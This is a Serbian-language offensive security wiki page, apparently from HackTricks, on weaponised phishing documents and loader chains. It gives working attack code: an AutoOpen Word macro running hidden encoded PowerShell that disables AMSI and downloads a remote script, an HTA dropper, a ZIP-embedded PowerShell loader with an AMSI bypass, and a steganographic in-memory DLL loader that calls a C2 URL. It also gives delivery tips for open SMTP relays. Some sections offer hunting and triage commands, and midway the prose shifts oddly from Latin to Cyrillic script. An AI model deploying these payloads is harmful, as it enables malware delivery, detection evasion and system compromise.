# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word proverava validnost podataka u fajlu pre nego što ga otvori. Provera validnosti podataka obavlja se identifikacijom strukture podataka, u skladu sa standardom OfficeOpenXML. Ako tokom identifikacije strukture podataka dođe do greške, analizirani fajl neće biti otvoren.

Word fajlovi koji sadrže makroe obično koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije, a da i dalje zadrži mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali Microsoft Word će obraditi DOCM fajl preimenovan u RTF i omogućiće izvršavanje makroa.\
Isti interni mehanizmi važe za sav softver iz paketa Microsoft Office (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje će ekstenzije izvršavati neki Office programi:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX fajlovi koji upućuju na udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji sadrži makroe mogu takođe da „izvrše“ makroe.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Kategorije**: Veze i reference, **Nazivi polja**: includePicture, i **Naziv fajla ili URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Makroi se mogu koristiti za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su one češće, veća je verovatnoća da će ih AV otkriti.

- AutoOpen()
- Document_Open()

#### Primeri koda za makroe

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document** da biste otvorili Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored stavke **Document Properties and Personal Information**.

#### Doc ekstenzija

Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
Uradite to zato što **ne možete da sačuvate makroe unutar datoteke `.docx`**, a oko ekstenzije **`.docm`** koja podržava makroe postoji **stigma** (npr. ikonica sličice ima veliko `!`, a neki web/email gateway sistemi ih potpuno blokiraju). Zato je ova **zastarela ekstenzija `.doc` najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT makroi sa automatskim pokretanjem (Basic)

LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan makro za reverse shell izgleda ovako:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Obratite pažnju na udvojene navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escapeovanje doslovnih navodnika, tako da payloadovi koji se završavaju sa `...==""")` imaju uravnotežene i unutrašnju komandu i Shell argument.

Saveti za isporuku:

- Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
- Kada šaljete e-poštu pomoću `swaks`, koristite `--attach @resume.odt` (`@` je neophodan kako bi se sadržaj fajla, a ne tekst naziva fajla, poslao kao prilog). Ovo je ključno kada se zloupotrebljavaju SMTP serveri koji prihvataju proizvoljne `RCPT TO` primaoce bez provere.

## HTA fajlovi

HTA je Windows program koji **objedinjuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao „potpuno pouzdana“ aplikacija, bez ograničenja bezbednosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorerom**, zbog čega **`mshta` zavisi od IE-a**. Ako je IE deinstaliran, HTA fajlovi neće moći da se izvršavaju.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Prisiljavanje NTLM autentifikacije

Postoji nekoliko načina da **„daljinski“ primorate NTLM autentifikaciju**. Na primer, možete da dodate **nevidljive slike** u imejlove ili HTML stranice kojima će korisnik pristupiti (čak i HTTP MitM?). Ili pošaljite žrtvi **putanju do datoteka** koje će **pokrenuti** **autentifikaciju** čim **otvori fasciklu**.

**Proverite ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da možete ne samo da ukradete hash ili podatke za autentifikaciju već i da **izvedete NTLM relay napade**:

- [**NTLM Relay napadi**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do sertifikata)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK učitavači + payload-i ugrađeni u ZIP (fileless lanac)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna dokumenta za odvraćanje pažnje (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader smešten u sirovim bajtovima ZIP-a, iza jedinstvene oznake, a .lnk ga izdvaja i pokreće u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira PowerShell jednolinijska komanda u .lnk datoteci:

1) Pronađite originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i nadređenom direktorijumu trenutnog radnog direktorijuma.
2) Pročitajte bajtove ZIP-a i pronađite hardkodiranu oznaku (npr. xFIQCV). Sve što sledi nakon oznake predstavlja ugrađeni PowerShell payload.
3) Kopirajte ZIP u %ProgramData%, raspakujte ga tamo i otvorite lažni .docx da bi delovao legitimno.
4) Zaobiđite AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Dekodirajte sledeću fazu (npr. uklonite sve znakove #) i izvršite je u memoriji.

Primer PowerShell kostura za izdvajanje i pokretanje ugrađene faze:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Beleške
- Isporuka često zloupotrebljava poddomene renomiranih PaaS platformi (npr. *.herokuapp.com) i može ograničiti pristup payload-ima (isporučivati bezazlene ZIP-ove na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi smanjila broj artefakata na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokrene payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji pretražuje nadređene/korisničke fascikle da bi pronašao ZIP i otvorio dokument-mamac.
- AMSI tampering putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Duge poslovne prepiske koje završavaju linkovima hostovanim na trusted PaaS domenima.

## LNK staging sa mamcem na prvom mestu → persistence putem scheduled task-a → trusted CPL side-loading

Još jedan ponavljajući obrazac je **`.lnk` koji se predstavlja kao dokument**, a odmah otvara bezazlen mamac dok u pozadini priprema pravi lanac.<sup>[[3]](#references)</sup>

Uočeni tok rada:
1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloader-a.
2. PowerShell deli očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), tako da jednostavne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument-mamac**, otvara ga za žrtvu, a zatim u pozadini rekonstruiše zlonamerne datoteke.
4. Payload-i mogu biti upisani sa **bezvrednim ekstenzijama**, a zatim preimenovani uklanjanjem suvišnih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja pomoću **scheduled task-a koji se pokreće svakog minuta**, a koji pokreće trusted host binary sa putanje na koju korisnik može da upisuje.

Osnovni tragovi za hunting u ovom obrascu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Koristan raspored za prepoznavanje:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza prikrivena

U studiji slučaja Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio funkciju **`RunFODW`**, pouzdani Microsoftov binarni fajl učitavao je CPL napadača umesto legitimne sistemske kopije.

CPL zatim:
- Čita blob **AES-256-CBC** iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
- Alocira izvršivu memoriju i kopira dešifrovani shellcode
- Pokreće ga posredno tako što pokazivač na shellcode prosleđuje kao callback funkciji **`EnumUILanguagesW`**

Taj poslednji korak vredi posebno istražiti: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga злоупотребљава **legitimni WinAPI koji prihvata callback** za prenos izvršavanja.

Dešifrovani payload u овој кампањи био је shellcode **Donut**, који је затим у потпуности мапирао завршни PE у меморију и закрпио **AMSI/WLDP/ETW** у тренутном процесу пре него што је предао извршавање. За детаљније белешке о side-loading-у и накнадној обради у меморији погледајте:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичне смернице за претрагу:
- `.lnk` покреће `powershell.exe` или `conhost.exe`, након чега следи видљиви документ-мамац.
- Краткотрајна преузимања у **`C:\Users\Public\`**, након којих одмах следе преименовања из бесмислених екстензија.
- Заказани задаци са неупадљивим именима, попут `GoogleErrorReport`, који се извршавају из **директоријума у које корисник може да уписује**.
- Поуздани бинарни фајлови учитавају **`.cpl` / `.dll`** датотеке из истог директоријума који није системски.
- Base64 текстуални blob-ови уписани у **`C:\Windows\Tasks\`**, а затим прочитани помоћу модула учитаног side-loading-ом.

## Payload-ови у сликама, разграничени steganography маркерима (PowerShell stager)

Недавни ланци за учитавање испоручују замагљени JavaScript/VBS који декодира и покреће Base64 PowerShell stager. Тај stager преузима слику (често GIF) која садржи Base64-енкодирану .NET DLL сакривену као обичан текст између јединствених почетних и завршних маркера. Скрипта тражи ове граничнике (примери уочени у стварним нападима: «<<sudo_png>> … <<sudo_odt>>>»), издваја текст између њих, Base64-декодира га у бајтове, учитава склоп у меморију и позива познату улазну методу са C2 URL-ом.<sup>[[5]](#references)</sup>

Ток рада
- Фаза 1: Архивирани JS/VBS dropper → декодира уграђени Base64 → покреће PowerShell stager са -nop -w hidden -ep bypass.
- Фаза 2: PowerShell stager → преузима слику, издваја Base64 између маркера, учитава .NET DLL у меморију и позива њену методу (нпр. VAI), прослеђујући C2 URL и опције.
- Фаза 3: Loader преузима завршни payload и обично га убацује помоћу process hollowing-а у поуздани бинарни фајл (најчешће MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Више о process hollowing-у и извршавању преко поузданих услужних програма погледајте овде:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell пример за издвајање DLL-а из слике и позивање .NET методе у меморији:

<details>
<summary>PowerShell издвајач stego payload-а и loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganografija/sakrivanje markera).<sup>[[6]](#references)</sup> Markeri se razlikuju među kampanjama.
- AMSI/ETW bypass i deobfuskacija stringova se obično primenjuju pre učitavanja assembly-ja.
- Lov: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blobove.

Pogledajte i stego alate i tehnike izdvajanja podataka:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta početna faza je mali, snažno obfuskiran `.js` ili `.vbs` fajl isporučen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa opcijama `-nop -w hidden -ep bypass` kako bi pripremio sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>

Osnovna logika (apstraktno):
- Pročitajte sadržaj sopstvenog fajla
- Pronađite Base64 blob između besmislenih stringova
- Dekodirajte u ASCII PowerShell
- Izvršite pomoću `wscript.exe`/`cscript.exe` koji pokreće `powershell.exe`

Signali za lov
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` pokreće `powershell.exe -nop -w hidden` iz privremenih putanja korisnika.

## MSC dokumenti kao kontejneri za izvršavanje (GrimResource)

Microsoft Management Console fajlovi (`.msc`) su XML definicije konzola koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** koristi referencu `StringTable` ka resursu `apds.dll` koji sadrži stari XSS primitive, tako da otvaranje posebno napravljenе konzole dovodi do izvršavanja JavaScript-a unutar `mmc.exe`. Uočeni primerci kombinovali su obfuskaciju zasnovanu na `transformNode` sa **DotNetToJScript** kako bi instancirali .NET payload bez uobičajenog puta kroz Office macro.<sup>[[9]](#references)</sup>

Za statičku trijažu, tretirajte MSC fajl iz nepouzdanog izvora kao tekst i **nemojte** ga otvarati dvostrukim klikom:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Indikatori tokom izvršavanja sa visokim signalom uključuju učitavanje CLR-a ili skriptnih komponenti od strane `mmc.exe`, uspostavljanje mrežnih veza ili pokretanje procesa `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivane izvršne datoteke. Format je legitiman, pa detekcije treba da povezuju **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju svaki MSC.<sup>[[9]](#references)</sup>

## PDF/QR preusmerivači i uslovljavanje isporuke payload-a

PDF ne mora da sadrži exploit da bi bio koristan. U nedavnim kampanjama u dokumentima koji deluju bezazleno postavljaju se **QR code ili običan link**, sesija pregledača se preusmerava izvan kontrola e-pošte, a odredište se prilagođava adresi primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do infrastrukture za krađu akreditiva RaccoonO365; u paralelnom lancu korišćeno je uslovljavanje prema IP-u/okruženju da bi se odabranim posetiocima isporučila JavaScript/MSI putanja, a skenerima ili nedozvoljenim klijentima bezazlen PDF.<sup>[[10]](#references)</sup>

Tokom trijaže proverite i PDF radnje i prikazane QR kodove. QR može biti nacrtan kao vektor, umesto da bude sačuvan kao slika koja se može izdvojiti, pa rasterizujte svaku stranicu i izdvojte ugrađene slike:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Pregledajte dekodirana odredišta i preusmeravanja iz izolovanog sistema za analizu, bez autentifikacije. Korisni pokazatelji za analizu uključuju PDF-ove koji sadrže samo QR kod, uz gotovo prazne poruke e-pošte, adresu primaoca ugrađenu u parametar upita, više preusmeravanja preko uglednih hosting servisa i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, cookies, referrer-a ili user agent-a. Uporedite zahteve pomoću kontrolisanih profila, jer jedno preuzimanje iz sandbox-a može dobiti samo mamac.<sup>[[10]](#references)</sup>

## Windows datoteke za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM kredencijala**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampanja ZipLine: sofisticirani phishing napad usmeren na kompanije u SAD-u](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: praćenje taktika grupe Dropping Elephant kroz lanac loader-a sa temom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Otmica TypeLib-a – Nova tehnika COM postojanosti (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje različite infostealer-e](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografija (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Izvršavanje preko pouzdanih razvojnih alatki: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za početni pristup i izbegavanje detekcije](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za pokretanje phishing kampanja sa poreskom temom](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
